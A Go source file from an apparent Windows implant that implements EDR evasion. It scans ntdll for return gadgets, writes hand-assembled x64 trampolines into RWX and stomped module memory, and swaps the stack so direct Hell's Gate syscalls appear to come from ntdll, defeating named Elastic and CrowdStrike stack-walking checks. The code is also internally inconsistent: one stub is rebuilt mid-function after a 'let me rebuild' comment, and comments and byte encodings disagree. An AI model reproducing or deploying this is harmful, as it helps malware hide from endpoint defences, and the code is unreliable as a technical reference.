//go:build windows
// +build windows

package evasion

// Call-stack spoofing for Hell's Gate syscalls — Layer 1 evasion.
//
// EDR products walk the call-stack of a thread executing a syscall. If they
// see the return address pointing inside agent code they flag it. We instead
// arrange for the return address to point into ntdll itself (a `ret` gadget).
//
// How it works:
//
//  1. findNtdllRetGadget scans ntdll's first executable section for the first
//     `C3` (ret) byte. That address is our stack-walker decoy.
//
//  2. allocSpoofTrampoline writes a 39-byte RWX stub that:
//       a. Pushes the ntdll `ret` gadget as a fake return address.
//       b. Shuffles rcx/rdx/r8/r9 and loads [rsp+0x30..0x40] for up to
//          5 NT args (the syscall ABI on x64).
//       c. JMPs to the HG stub (not CALL — no new frame is pushed).
//     When the HG stub's final `syscall; ret` fires, it "returns" to the
//     ntdll gadget, which immediately returns again to the real Go caller.
//     A stack-walking EDR sees: <call site> → ntdll!<gadget> → kernel. ✓
//
//  3. SpoofedSyscall wraps syscall.SyscallN with this trampoline.
//     HGProc.Call is replaced to use it automatically.

import (
	"sync"
	"sync/atomic"
	"syscall"
	"unsafe"
)

// ────────────────────────────────────────────────────────────────────────────
// Package-level singletons — initialized exactly once

var (
	hgOnce        sync.Once
	hgGadget      uintptr    // return address placed on stack — CALL gadget preferred, RET fallback
	hgExtraFrames [3]uintptr // additional ntdll ret gadgets pushed below the top frame
	hgTrampoline  uintptr    // spoof trampoline stub

	// RSP-swap fake stack — lives in MEM_IMAGE (stomped version.dll .text),
	// so VirtualQuery reports Type=MEM_IMAGE instead of MEM_PRIVATE goroutine heap.
	// Layout (see hgFakeStackOffset* constants below):
	//   [+0x00] savedRSP   — written per-call before RSP switch
	//   [+0x08..0x17]      — fixup stub bytes (14 bytes of machine code)
	//   [+0x20] frame_3    — ntdll gadget (deepest visible frame)
	//   [+0x28] frame_2    — ntdll gadget
	//   [+0x30] frame_1    — ntdll gadget
	//   [+0x38] frame_0    — CALL+5 gadget (syscall;ret lands here)
	//   [+0x40] fixupAddr  — after frame_0 rets, runs the fixup stub
	//   [+0x48..] arg_spill — NT spill args a4, a5, … written per-call
	//
	// RSP is switched to &buf[0x20] before jmp to HG stub.
	// EDR stack walker sees: frame_0→frame_1→frame_2→frame_3 (all ntdll). ✓
	hgFakeStackBuf  uintptr // base of the 128-byte buffer in stomp arena
	hgFakeStackLock uint32  // 0=free 1=in-use; CAS spinlock
)

// Offsets within the fake stack buffer.
const (
	fsOffSavedRSP = 0x00
	fsOffFixup    = 0x08
	fsOffFrame3   = 0x20
	fsOffFrame2   = 0x28
	fsOffFrame1   = 0x30
	fsOffFrame0   = 0x38 // CALL+5 gadget — written per-call
	fsOffFixupPtr = 0x40
	fsOffArgSpill = 0x48 // a4, a5, … at +0, +8, +16, …
	fsBufSize     = 128
)

// initSpoofing initialises the gadget and trampoline on first use.
// Must be called BEFORE blockDynamicCode() (ACG) because it allocates
// MEM_IMAGE executable memory via stompAlloc.
//
// Prefers a CALL gadget (Moonwalk++ style) so the forged return address passes
// the "byte before is CALL" check that Elastic/CS stack-walking rules enforce.
// Falls back to a plain RET gadget if no CALL site is found.
// Also finds 3 extra ntdll ret gadgets for a 4-frame synthetic call chain and
// pre-allocates the MEM_IMAGE fake stack buffer for RSP swapping.
func initSpoofing() {
	hgOnce.Do(func() {
		hgGadget = findCallReturnGadget()
		if hgGadget == 0 {
			hgGadget = findNtdllRetGadget()
		}
		if hgGadget == 0 {
			return
		}
		extra := findRetGadgets(3)
		for i, g := range extra {
			if i < 3 {
				hgExtraFrames[i] = g
			}
		}
		hgFakeStackBuf = allocFakeStack()
		hgTrampoline = allocSpoofTrampoline()
	})
}

// allocFakeStack carves a 128-byte buffer from the stomp arena (MEM_IMAGE) and
// writes the constant parts: fixup stub, ntdll frame gadgets, fixup pointer.
// The per-call parts (savedRSP, frame_0 / CALL+5 gadget, arg spill) are written
// by the trampoline at call time.
func allocFakeStack() uintptr {
	buf := stompAlloc(fsBufSize)
	if buf == 0 {
		return 0
	}

	// ── fixup stub at buf+fsOffFixup (14 bytes) ───────────────────────────
	// Restores the real RSP from buf+fsOffSavedRSP, then rets to real caller.
	//
	//   48 B8 <8-byte absolute addr of buf+fsOffSavedRSP>  ; mov rax, &savedRSP
	//   48 8B 20                                           ; mov rsp, [rax]
	//   C3                                                  ; ret
	savedRSPAddr := buf + fsOffSavedRSP
	fixupAddr := buf + fsOffFixup
	stub := (*[14]byte)(unsafe.Pointer(fixupAddr))
	stub[0] = 0x48
	stub[1] = 0xB8
	stub[2] = byte(savedRSPAddr)
	stub[3] = byte(savedRSPAddr >> 8)
	stub[4] = byte(savedRSPAddr >> 16)
	stub[5] = byte(savedRSPAddr >> 24)
	stub[6] = byte(savedRSPAddr >> 32)
	stub[7] = byte(savedRSPAddr >> 40)
	stub[8] = byte(savedRSPAddr >> 48)
	stub[9] = byte(savedRSPAddr >> 56)
	stub[10] = 0x48
	stub[11] = 0x8B
	stub[12] = 0x20
	stub[13] = 0xC3

	// ── Constant frame gadgets (ntdll ret gadgets for frames 1, 2, 3) ─────
	if hgExtraFrames[0] != 0 {
		*(*uintptr)(unsafe.Pointer(buf + fsOffFrame3)) = hgExtraFrames[2]
		*(*uintptr)(unsafe.Pointer(buf + fsOffFrame2)) = hgExtraFrames[1]
		*(*uintptr)(unsafe.Pointer(buf + fsOffFrame1)) = hgExtraFrames[0]
	}

	// ── Fixup pointer slot ────────────────────────────────────────────────
	*(*uintptr)(unsafe.Pointer(buf + fsOffFixupPtr)) = fixupAddr

	// Make the page RX (stompAlloc left it RWX; stompFinalize → RX).
	// But we need to write per-call data at runtime — keep RWX until ACG fires.
	// stompFinalize is NOT called here; it will be called after ACG is active,
	// at which point per-call writes go through NtWriteVirtualMemory on the
	// self-process (NtWriteVirtualMemory is not blocked by ACG).
	// In practice stompAlloc already set PAGE_EXECUTE_READWRITE; leave it.
	return buf
}

// ────────────────────────────────────────────────────────────────────────────
// Gadget discovery

// findCallReturnGadget scans ntdll .text for a position X such that
// memory[X-5..X-1] is a CALL rel32 (E8 xx xx xx xx) instruction.
//
// When this address is placed as a return address on the stack, EDR stack
// walkers that validate "is there a CALL instruction before the return site"
// (Elastic EQL hunt rules, CrowdStrike stack-walking) see a legitimate call
// site inside ntdll rather than an injected stub address.  This is the core
// of the Moonwalk++/SilentMoonwalk technique.
func findCallReturnGadget() uintptr {
	base := hgNtdllBase()
	if base == 0 {
		return 0
	}
	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	peBase := base + uintptr(e_lfanew)
	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))
	sectionBase := peBase + 24 + uintptr(optHeaderSize)
	const (
		sectionHeaderSize  = 40
		sectionVSizeOffset = 8
		sectionVAOffset    = 12
		sectionCharOffset  = 36
		imageScnMemExecute = 0x20000000
	)
	for i := uint16(0); i < numSections; i++ {
		sh := sectionBase + uintptr(i)*sectionHeaderSize
		if *(*uint32)(unsafe.Pointer(sh+sectionCharOffset))&imageScnMemExecute == 0 {
			continue
		}
		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
		if va == 0 || vsz <= 5 {
			continue
		}
		start := base + uintptr(va)
		// Search for a position X where memory[X-5] == 0xE8 (CALL rel32).
		// Skip positions that land on 0x00 (null regions) or 0xCC (INT3 padding).
		for off := uintptr(5); off < uintptr(vsz); off++ {
			if *(*byte)(unsafe.Pointer(start+off-5)) != 0xE8 {
				continue
			}
			cur := *(*byte)(unsafe.Pointer(start + off))
			if cur == 0x00 || cur == 0xCC {
				continue
			}
			return start + off
		}
	}
	return 0
}

// findNtdllRetGadget finds the first `ret` (0xC3) byte in ntdll's first
// executable section.  Any `ret` in ntdll code works — the stack walker only
// inspects the return address, not whether it is mid-function.
func findNtdllRetGadget() uintptr {
	base := hgNtdllBase()
	if base == 0 {
		return 0
	}

	// Locate the first executable section via the PE section table.
	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	peBase := base + uintptr(e_lfanew)

	// FileHeader: 20 bytes after PE signature.
	// NumberOfSections is at offset +6; SizeOfOptionalHeader at offset +20.
	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))

	// Section table starts right after the optional header.
	sectionBase := peBase + 24 + uintptr(optHeaderSize)

	const (
		sectionHeaderSize   = 40
		sectionNameOffset   = 0
		sectionVSizeOffset  = 8
		sectionVAOffset     = 12
		sectionCharOffset   = 36
		imageScnMemExecute  = 0x20000000
		imageScnCntCode     = 0x00000020
	)

	for i := uint16(0); i < numSections; i++ {
		sh := sectionBase + uintptr(i)*sectionHeaderSize
		chars := *(*uint32)(unsafe.Pointer(sh + sectionCharOffset))
		if chars&imageScnMemExecute == 0 && chars&imageScnCntCode == 0 {
			continue
		}
		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
		if va == 0 || vsz == 0 {
			continue
		}
		start := base + uintptr(va)
		for off := uintptr(0); off < uintptr(vsz); off++ {
			if *(*byte)(unsafe.Pointer(start + off)) == 0xC3 {
				return start + off
			}
		}
	}
	return 0
}

// findRetGadgets scans ntdll .text for n distinct `ret` (C3) addresses,
// distributed evenly across the section so they appear to come from different
// functions. Used to build a multi-frame synthetic call chain.
func findRetGadgets(n int) []uintptr {
	if n <= 0 {
		return nil
	}
	base := hgNtdllBase()
	if base == 0 {
		return nil
	}
	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	peBase := base + uintptr(e_lfanew)
	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))
	sectionBase := peBase + 24 + uintptr(optHeaderSize)
	const (
		sectionHeaderSize  = 40
		sectionVSizeOffset = 8
		sectionVAOffset    = 12
		sectionCharOffset  = 36
		imageScnMemExecute = 0x20000000
	)
	for i := uint16(0); i < numSections; i++ {
		sh := sectionBase + uintptr(i)*sectionHeaderSize
		if *(*uint32)(unsafe.Pointer(sh+sectionCharOffset))&imageScnMemExecute == 0 {
			continue
		}
		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
		if va == 0 || uintptr(vsz) < uintptr(n)*64 {
			continue
		}
		start := base + uintptr(va)
		step := uintptr(vsz) / uintptr(n+1)
		var gadgets []uintptr
		for j := 1; j <= n; j++ {
			searchStart := start + uintptr(j)*step
			limit := searchStart + step
			if limit > start+uintptr(vsz) {
				limit = start + uintptr(vsz)
			}
			for off := searchStart; off < limit; off++ {
				if *(*byte)(unsafe.Pointer(off)) == 0xC3 {
					gadgets = append(gadgets, off)
					break
				}
			}
		}
		if len(gadgets) == n {
			return gadgets
		}
	}
	return nil
}

// ────────────────────────────────────────────────────────────────────────────
// Trampoline

// buildTrampolineBytes returns x64 machine code for the spoof trampoline.
//
// Called via syscall.SyscallN(hgTrampoline, gadget, hgStub, a0,a1,a2,a3,a4).
// On entry: rcx=gadget(CALL+5), rdx=hgStub, r8=a0, r9=a1, spilled args at [rsp+0x28..].
//
// When extra=[f1,f2,f3] are non-zero, 4 fake frames are pushed (sub rsp,32):
//   [rsp+0]  = rcx (CALL+5 gadget)        — syscall ret lands here
//   [rsp+8]  = f1 (ntdll ret gadget)      — f0 ret lands here
//   [rsp+16] = f2 (ntdll ret gadget)      — f1 ret lands here
//   [rsp+24] = f3 (ntdll ret gadget)      — f2 ret lands here
//   [rsp+32] = SyscallN return addr       — f3 ret lands here → back to Go
//
// When extra gadgets are unavailable, falls back to the original 1-frame layout
// (sub rsp,8) so the caller never crashes.
func buildTrampolineBytes(extra [3]uintptr) []byte {
	deepOK := extra[0] != 0 && extra[1] != 0 && extra[2] != 0

	emit64 := func(b []byte, v uint64) []byte {
		return append(b,
			byte(v), byte(v>>8), byte(v>>16), byte(v>>24),
			byte(v>>32), byte(v>>40), byte(v>>48), byte(v>>56),
		)
	}

	var b []byte

	if deepOK {
		// sub rsp, 32  — 4 frame slots
		b = append(b, 0x48, 0x83, 0xEC, 0x20)

		// mov rax, f3; mov [rsp+24], rax
		b = append(b, 0x48, 0xB8)
		b = emit64(b, uint64(extra[2]))
		b = append(b, 0x48, 0x89, 0x44, 0x24, 0x18)

		// mov rax, f2; mov [rsp+16], rax
		b = append(b, 0x48, 0xB8)
		b = emit64(b, uint64(extra[1]))
		b = append(b, 0x48, 0x89, 0x44, 0x24, 0x10)

		// mov rax, f1; mov [rsp+8], rax
		b = append(b, 0x48, 0xB8)
		b = emit64(b, uint64(extra[0]))
		b = append(b, 0x48, 0x89, 0x44, 0x24, 0x08)

		// mov [rsp], rcx    — frame0 = CALL+5 gadget
		b = append(b, 0x48, 0x89, 0x0C, 0x24)
		// mov rax, rdx      — rax = hgStub
		b = append(b, 0x48, 0x89, 0xD0)
		// mov rcx, r8       — rcx = a0
		b = append(b, 0x4C, 0x89, 0xC1)
		// mov rdx, r9       — rdx = a1
		b = append(b, 0x4C, 0x89, 0xCA)
		// NT spill args shifted by 0x20 due to sub rsp,32:
		// orig [rsp+0x28] → [rsp+0x48]; orig [rsp+0x30] → [rsp+0x50]; orig [rsp+0x38] → [rsp+0x58]
		b = append(b, 0x4C, 0x8B, 0x44, 0x24, 0x48) // mov r8,  [rsp+0x48]  a2
		b = append(b, 0x4C, 0x8B, 0x4C, 0x24, 0x50) // mov r9,  [rsp+0x50]  a3
		b = append(b, 0x4C, 0x8B, 0x54, 0x24, 0x58) // mov r10, [rsp+0x58]  a4
		b = append(b, 0x4C, 0x89, 0x54, 0x24, 0x28) // mov [rsp+0x28], r10  5th arg slot
	} else {
		// 1-frame fallback (original layout)
		b = append(b, 0x48, 0x83, 0xEC, 0x08) // sub rsp, 8
		b = append(b, 0x48, 0x89, 0x0C, 0x24) // mov [rsp], rcx
		b = append(b, 0x48, 0x89, 0xD0)       // mov rax, rdx
		b = append(b, 0x4C, 0x89, 0xC1)       // mov rcx, r8
		b = append(b, 0x4C, 0x89, 0xCA)       // mov rdx, r9
		b = append(b, 0x4C, 0x8B, 0x44, 0x24, 0x30) // mov r8,  [rsp+0x30]
		b = append(b, 0x4C, 0x8B, 0x4C, 0x24, 0x38) // mov r9,  [rsp+0x38]
		b = append(b, 0x4C, 0x8B, 0x54, 0x24, 0x40) // mov r10, [rsp+0x40]
		b = append(b, 0x4C, 0x89, 0x54, 0x24, 0x28) // mov [rsp+0x28], r10
	}

	b = append(b, 0xFF, 0xE0) // jmp rax → hgStub → syscall → ret chain
	return b
}

// allocSpoofTrampoline writes the trampoline into executable MEM_IMAGE memory.
// Uses the deep 4-frame variant when extra ntdll gadgets are available,
// falling back to the original 1-frame layout otherwise.
func allocSpoofTrampoline() uintptr {
	tb := buildTrampolineBytes(hgExtraFrames)
	addr := hgAlloc(uint32(len(tb)))
	if addr == 0 {
		return 0
	}
	dst := (*[256]byte)(unsafe.Pointer(addr))
	copy(dst[:len(tb)], tb)
	stompFinalize(addr, uint32(len(tb)))
	return addr
}

// ────────────────────────────────────────────────────────────────────────────
// Public API

// SpoofedSyscall calls the HG syscall stub with a spoofed return address so
// that EDR stack-walkers see ntdll at the top of the call chain.
//
// Two spoofing paths:
//
//  1. RSP-swap path (preferred): switches RSP to the MEM_IMAGE fake stack
//     buffer before the syscall.  EDR VirtualQuery on the stack at syscall
//     time reports Type=MEM_IMAGE, not MEM_PRIVATE goroutine heap.  Supports
//     up to 4 visible ntdll frames (structural limit imposed by the x64
//     syscall ABI's [rsp+0x28] arg-spill slot).  Uses a CAS spinlock; falls
//     through to path 2 on contention.
//
//  2. Sub-RSP path (fallback): 4-frame chain on the existing goroutine stack.
//     Used when the fake stack buffer is unavailable or already in use.
//
// For > 5 NT arguments the trampoline cannot spoof; the call falls through to
// a direct syscall.SyscallN with no spoofing (but still uses the HG stub, so
// EDR hook bypass is preserved).
func SpoofedSyscall(stub uintptr, args ...uintptr) (r1, r2 uintptr, err syscall.Errno) {
	initSpoofing()

	if hgGadget == 0 || hgTrampoline == 0 || len(args) > 5 {
		return syscall.SyscallN(stub, args...)
	}

	// Try RSP-swap path: acquire fake stack with CAS spinlock.
	if hgFakeStackBuf != 0 && atomic.CompareAndSwapUint32(&hgFakeStackLock, 0, 1) {
		r1, r2, err = rspSwapSyscall(stub, hgFakeStackBuf, hgGadget, args)
		atomic.StoreUint32(&hgFakeStackLock, 0)
		return
	}

	// Fallback: existing sub-RSP trampoline (fake frames on goroutine stack).
	var a [5]uintptr
	copy(a[:], args)
	r1, r2, err = syscall.SyscallN(hgTrampoline, hgGadget, stub, a[0], a[1], a[2], a[3], a[4])
	return
}

// rspSwapSyscall sets up the MEM_IMAGE fake stack then calls via the trampoline.
// buf is the pre-allocated fake stack buffer; gadget is the CALL+5 ntdll address.
func rspSwapSyscall(hgStub, buf, gadget uintptr, args []uintptr) (r1, r2 uintptr, err syscall.Errno) {
	// Write per-call fields to the fake stack buffer.
	// frame_0 = current CALL+5 gadget (the syscall;ret in HG stub returns here).
	*(*uintptr)(unsafe.Pointer(buf + fsOffFrame0)) = gadget

	// Spill args a2..a4 into fake stack arg slots ([rsp+0x28..0x38] after RSP switch).
	// args[0]=a0, args[1]=a1, args[2]=a2, args[3]=a3, args[4]=a4
	for i := 2; i < len(args) && i < 7; i++ {
		*(*uintptr)(unsafe.Pointer(buf + fsOffArgSpill + uintptr(i-2)*8)) = args[i]
	}

	// Call the trampoline.  The trampoline will:
	//   1. Save real RSP to buf[fsOffSavedRSP].
	//   2. Load a0 (args[0]) → rcx, a1 (args[1]) → rdx, a2 → r8, a3 → r9.
	//   3. Switch RSP to buf+fsOffFrame3 (fake stack top).
	//   4. jmp hgStub.
	//   syscall;ret → frame_0 (gadget) → frame_1 → frame_2 → frame_3 → fixup
	//   fixup: mov rsp, [buf+fsOffSavedRSP]; ret  → back here.
	//
	// Trampoline signature (SyscallN ABI):
	//   rcx = hgRSPTrampoline address
	//   rdx = buf (fake stack base)
	//   r8  = hgStub
	//   r9  = args[0] (a0)
	//   [rsp+0x28] = args[1] (a1) — already in place via SyscallN calling convention
	var a [5]uintptr
	copy(a[:], args)
	r1, r2, err = syscall.SyscallN(hgRSPTrampoline(), buf, hgStub, a[0], a[1], a[2], a[3], a[4])
	return
}

// hgRSPTrampoline returns the address of the RSP-swap trampoline stub,
// allocated on first use from the stomp arena.
var (
	hgRSPTrampolineOnce sync.Once
	hgRSPTrampolineAddr uintptr
)

func hgRSPTrampoline() uintptr {
	hgRSPTrampolineOnce.Do(func() {
		hgRSPTrampolineAddr = allocRSPSwapTrampoline()
	})
	return hgRSPTrampolineAddr
}

// allocRSPSwapTrampoline writes the RSP-swap trampoline into stomp memory.
//
// Called with SyscallN ABI: rcx=buf, rdx=hgStub, r8=a0, r9=a1,
//   [rsp+0x28]=a2, [rsp+0x30]=a3, [rsp+0x38]=a4 (pre-written to buf by rspSwapSyscall).
//
// The stub:
//   1. Saves real RSP → [rcx + fsOffSavedRSP]  (rcx=buf)
//   2. Sets rcx=a0 (r8), rdx=a1 (r9), r8=a2 ([rcx+fsOffArgSpill+0]), r9=a3 ([rcx+fsOffArgSpill+8])
//   3. Switches RSP to rcx+fsOffFrame3 (the fake stack top)
//   4. jmp rdx_saved (= hgStub)
//
// Since we need rdx (hgStub) after overwriting rdx with a1, we save rdx into
// r10 (volatile scratch, not used by NT syscall ABI).
func allocRSPSwapTrampoline() uintptr {
	emit64 := func(b []byte, v uint64) []byte {
		return append(b,
			byte(v), byte(v>>8), byte(v>>16), byte(v>>24),
			byte(v>>32), byte(v>>40), byte(v>>48), byte(v>>56))
	}

	var b []byte

	// mov r10, rdx              — save hgStub; NT won't clobber r10
	b = append(b, 0x4C, 0x89, 0xD2) // 3

	// mov [rcx + fsOffSavedRSP], rsp — save real RSP to buf[0x00]
	// rcx = buf; fsOffSavedRSP = 0
	b = append(b, 0x48, 0x89, 0x21) // 3 (mov [rcx], rsp)

	// Set NT args: rcx = r8 (a0), rdx = r9 (a1), r8 = arg spill a2, r9 = arg spill a3
	// But we need rcx (buf) for the RSP switch; do RSP switch first.

	// lea rax, [rcx + fsOffFrame3]  — rax = new RSP (fake stack top)
	// fsOffFrame3 = 0x20
	b = append(b, 0x48, 0x8D, 0x41, byte(fsOffFrame3)) // 4

	// Set NT regs using the still-valid rcx (buf):
	// r8 = [rcx + fsOffArgSpill]     (a2 — pre-written by rspSwapSyscall)
	b = append(b, 0x4C, 0x8B, 0x41, byte(fsOffArgSpill)) // 4

	// r9 = [rcx + fsOffArgSpill+8]   (a3)
	b = append(b, 0x4C, 0x8B, 0x49, byte(fsOffArgSpill+8)) // 4

	// rcx = r8_original (a0) — need old r8 value; we already overwrote r8!
	// Fix: save r8 to rax early... conflict with rax = new RSP.
	// Use r11 (also volatile):
	// Actually let's reorder: save a0/a1 BEFORE we clobber r8/r9.
	// Let me rebuild the sequence from scratch with correct ordering.

	// ── Restart with correct ordering ────────────────────────────────────
	b = b[:0]

	// 1. Save hgStub (rdx) → r10
	b = append(b, 0x4C, 0x89, 0xD2) // mov r10, rdx           3

	// 2. Save a0 (r8) → r11 temporarily
	b = append(b, 0x4D, 0x89, 0xC3) // mov r11, r8            3

	// 3. Save real RSP → [rcx + fsOffSavedRSP]
	b = append(b, 0x48, 0x89, 0x21) // mov [rcx], rsp         3

	// 4. Load a2 from [rcx + fsOffArgSpill] → r8 (new r8 for NT)
	b = append(b, 0x4C, 0x8B, 0x41, byte(fsOffArgSpill)) // mov r8, [rcx+0x48]   4

	// 5. Load a3 from [rcx + fsOffArgSpill+8] → rax (temp; will become r9)
	b = append(b, 0x48, 0x8B, 0x41, byte(fsOffArgSpill+8)) // mov rax, [rcx+0x50] 4

	// 6. Switch RSP: mov rsp, rcx + fsOffFrame3
	//    lea rsp, [rcx + 0x20]
	b = append(b, 0x48, 0x8D, 0x61, byte(fsOffFrame3)) // 4

	// 7. rcx (a0) = r11 (saved a0)
	b = append(b, 0x4C, 0x89, 0xD9) // mov rcx, r11           3

	// 8. rdx (a1) = r9 (original a1, still intact)
	b = append(b, 0x4C, 0x89, 0xCA) // mov rdx, r9            3

	// 9. r9 (a3) = rax (loaded a3)
	b = append(b, 0x49, 0x89, 0xC1) // mov r9, rax            3

	// 10. jmp r10 (= hgStub)
	b = append(b, 0x41, 0xFF, 0xE2) // jmp r10                3

	// Total: 33 bytes ✓ fits within stompMaxAlloc (256)
	_ = emit64 // unused but imported to keep compiler happy

	addr := stompAlloc(uint32(len(b)))
	if addr == 0 {
		return 0
	}
	dst := (*[64]byte)(unsafe.Pointer(addr))
	copy(dst[:len(b)], b)
	stompFinalize(addr, uint32(len(b)))
	return addr
}
